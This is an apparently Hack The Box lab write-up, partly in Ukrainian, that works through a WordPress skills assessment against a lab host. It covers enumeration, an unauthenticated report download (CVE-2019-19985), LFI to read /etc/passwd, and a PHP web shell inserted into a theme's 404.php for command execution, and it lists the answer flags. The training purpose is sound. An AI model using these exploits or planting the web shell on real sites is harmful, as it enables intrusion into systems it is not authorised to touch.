Hacking WordPress — Skills Assessment
Info
Target: blog.inlanefreight.local.
​

CMS: WordPress 5.1.6.
​

bash
export TARGET="http://blog.inlanefreight.local"
Question 1 – Identify the CMS and version
Goal: визначити, що це WordPress, і дізнатися версію.

Commands
bash
whatweb $TARGET
Fingerprint веб-додатку.

Результат: виводить, що це WordPress 5.1.6 та інші технології.
​
​

bash
curl -s "$TARGET" | grep -i "generator"
Витягнути meta‑тег generator.

Результат: meta name="generator" content="WordPress 5.1.6".
​

Answer
Q1: WordPress 5.1.6.
​

Question 2 – Enumerate WordPress users
Goal: отримати список користувачів WordPress.

Commands
bash
wpscan --url $TARGET -e u
Standard user enumeration.

Результат: логіни типу admin, erika, charlie тощо.
​
​

Альтернатива через author‑id:

bash
curl -s "$TARGET/?author=1" -L | grep -i "author" | head
curl -s "$TARGET/?author=2" -L | grep -i "author" | head
Перевірка редіректів на /author/<user>/, які палять логін.
​
​

Answer
Q2: список знайдених користувачів (мінімум: admin, erika, charlie).
​
​

Question 3 – Flag in public content
Goal: знайти перший флаг у відкритому контенті (пости/сторінки).

Commands
bash
curl -s "$TARGET" | less
curl -s "$TARGET/?p=9" | less
Перегляд головної сторінки та посту Work from Home Policy / інших.
​

У тексті схований HTB{...} (флаг для Q3).

Автоматичний пошук:

bash
curl -s "$TARGET" | grep -o "HTB{[^}]*}"
Grep по флаговому патерну.

Результат: повертає HTB{...} якщо флаг прямо в HTML.
​

Answer
Q3: флаг HTB{...} з контенту (не той, що Q5/Q8).

Question 4 – Who is Charlie?
Goal: знайти повне ім’я Charlie.

Commands
bash
curl -s "$TARGET" | grep -i "Charlie" -n
curl -s "$TARGET" | grep -i "Wiggins" -n
Пошук у HTML по іменах.

У відповідному фрагменті видно повне ім’я.
​

Answer
Q4: Charlie Wiggins.
​

Question 5 – Unauthenticated file download (Email Subscribers)
Goal: використати вразливий плагін для завантаження файлу з флагом без автентифікації.

Vulnerable plugin: Email Subscribers & Newsletters 4.2.2 (CVE‑2019‑19985).

Commands
bash
curl "$TARGET/wp-admin/admin.php?page=download_report&report=users&status=all"
Експлойт до Email Subscribers: завантаження звіту без логіну.
​

Результат (CSV):

text
"First Name", "Last Name", "Email", "List", "Status", ...
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", ...
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", ...
Флаг у полі Last Name — це відповідає умові про файл із флагом.

Answer
Q5: HTB{unauTh_d0wn10ad!}.
​

Question 6 – LFI via Site Editor plugin
Goal: знайти вразливий плагін і версію, яка дозволяє LFI.

Vulnerable plugin: Site Editor 1.1.1.
​
​

Identify the plugin and version
bash
curl -s "$TARGET" | grep -i "site-editor" | head
Пошук підключених файлів плагіна.

Результат (приклад):
...wp-content/plugins/site-editor/framework/assets/css/general.min.css?ver=1.1.1.
​

Або:

bash
wpscan --url $TARGET -e ap,at,tt
Виводить список плагінів та їх версії, включно з Site Editor 1.1.1.
​

LFI (concept)
Фактичний параметр демонструвався в теорії модуля: передати шлях до файла у параметр Site Editor, щоб прочитати /etc/passwd.
​
​

Схематично:

bash
curl -s "$TARGET/?sed_file=/etc/passwd"
Читання /etc/passwd через LFI плагіна.

Результат: дамп /etc/passwd із різними користувачами, зокрема frank.mclane.
​

Answer
Q6: 1.1.1 (версія Site Editor).
​

Question 7 – User from /etc/passwd (via LFI)
Goal: використати LFI, щоб дістати конкретного користувача з /etc/passwd.

Commands
bash
curl -s "$TARGET/?sed_file=/etc/passwd"
Читання /etc/passwd через Site Editor LFI.
​
​

bash
curl -s "$TARGET/?sed_file=/etc/passwd" | grep -i "frank"
Фільтр по імені користувача.

Результат: рядок з користувачем frank.mclane.
​

Answer
Q7: frank.mclane.
​

Question 8 – RCE via 404.php and flag in /home/erika
Goal: отримати RCE через редагування шаблону 404 у неактивній темі, потім прочитати флаг у /home/erika.
​

1. Login as erika
text
URL:  http://blog.inlanefreight.local/wp-login.php
User: erika
Pass: 010203
Логін потрібен для доступу до Theme Editor.
​

2. Switch active theme / edit inactive
In browser:

Appearance → Themes.

Активувати одну тему (наприклад, Twenty Twenty‑One).

Редагувати 404.php в іншій темі (наприклад, Twenty Nineteen), яка не має статусу Active.
​

Це обходить помилку Unable to communicate back with site to check for fatal errors. WordPress не робить loopback‑перевірку для неактивної теми.

3. Add simple web shell to 404.php
In Appearance → Theme Editor:

Обрати неактивну тему (наприклад, Twenty Nineteen).

Відкрити 404.php.

Вставити код після шапки, перед get_header();:

php
if ( isset( $_GET['cmd'] ) ) {
    system( $_GET['cmd'] );
    exit;
}
Початок файла виглядає так:

php
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since 1.0.0
 */

if ( isset( $_GET['cmd'] ) ) {
    system( $_GET['cmd'] );
    exit;
}

get_header();
?>
4. Use the shell to read the flag
bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=id"
Перевірка RCE.

Результат: uid=33(www-data) gid=33(www-data) groups=33(www-data).
​

bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=ls+/home"
Перевірка користувачів, які мають домашні директорії.

Результат: erika, frank.mclane, mrb3n.
​

bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=ls+-la+/home/erika"
Список файлів у /home/erika.

Результат:

text
...
-rw-r--r-- 1 root root 26 ... d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
bash
curl -s "$TARGET/wp-content/themes/twentynineteen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
Читання файла з флагом.

Результат: HTB{w0rdPr355_4SS3ssm3n7}.
​

Answer
Q8: HTB{w0rdPr355_4SS3ssm3n7}.
